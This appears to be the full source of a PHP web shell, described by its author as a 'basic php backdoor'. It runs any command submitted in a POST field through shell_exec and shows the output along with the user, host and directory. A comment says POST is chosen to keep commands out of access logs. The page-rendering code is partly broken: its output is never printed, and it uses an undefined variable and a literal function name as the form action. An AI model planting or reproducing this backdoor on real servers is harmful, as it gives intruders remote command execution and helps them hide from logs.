<?php echo 1+1; ?>
<?php

/*
{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}
>> 2233.php                                                          <<,
>>                                                                   <<,
>> a basic php backdoor i wrote for fun                              <<,
>> don't use this on someone else's server, that's naughty           <<,
>> besides weevely is so much better                                 <<,
>>                                                                   <<,
>> released in full compliance with the zf0 anti-copyright pledge    <<,
>>                                                                   <<,
>> i have no idea what i'm doing with this comment box decorating    <<,
>>                                                                   <<,
>> @reptar_xl                                                        <<,
>> badcunt.club                                                      <<,
{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}
*/


//   this is where the fun happens
//   the html element isn't called banana for any reason, basically 
//   just because i can, it's valid html so nyeh
//   POSTs because otherwise you'll leave stuff in the access logs
//   also, note all commands happen 2>&1 to save you from typing it

function continental_breakfast_is_not_real_breakfast($cmd){
		// this function does the shell exec
		echo "<banana>$ ". $cmd ."</banana>\r\n\r\n". shell_exec($cmd." 2>&1");
}

function up_the_dole(){
	// this is a few bits of inf0 for the user, like
	// www-data@website.org : /var/www/
	return shell_exec('echo "$(whoami)@$(hostname) : $(pwd)"');
}

function reddit_is_a_horrible_website(){
	// this is just the location of the script, we need this so the html form
	// knows where to submit the command, and so you when you press enter/submit,
	// you come back to the same page, and not some useless 404 page
	return basename($_SERVER['SCRIPT_NAME']);
}


// this is just formatting etc, skip this
function fuck_abbott($which){
	$html_top = <<< EOF
	<!DOCTYPE HTML>
	<html>
		<head>
			<style>
				input{background-color:#fff;width:50%;}code,input{font-size:12px;color:#000;font-family:"Monaco",
				"Consolas",monospace !important;}body{background-color:#fafafa;}banana{ color:#aaa;}
			</style>
		</head>
		<body>
			$up_the_dole
			<form action="reddit_is_a_horrible_website()" method="POST">
				<span>$ </span>
				<input type="text" name="whosthere" autocomplete="off" autofocus>
				<span>2&gt;&amp;1</span><br>
				<button value="Submit" name="submit" type="submit">~$$$$</button>
			</form>
			<code>
				<pre><br><br>
EOF;
	// gotta keep your html all semantic and proper and shit
	$html_bottom = <<< EOF
				</pre>
			</code>
		</body>
	</html>
EOF;

	if ($which == 0){
		return $html_top;
	} else {
		return $html_bottom;
	}

}

function main(){

	// top html
	fuck_abbott(0);

	// this is only false when some1 first
	// accesses the page, to stop it running
	// empty commands or w/e
	if (isset($_POST["whosthere"])) { // 5h3ll 3x3c
		continental_breakfast_is_not_real_breakfast($_POST['whosthere']);
	}

	// bottom html
	fuck_abbott(1);

}

main();

?>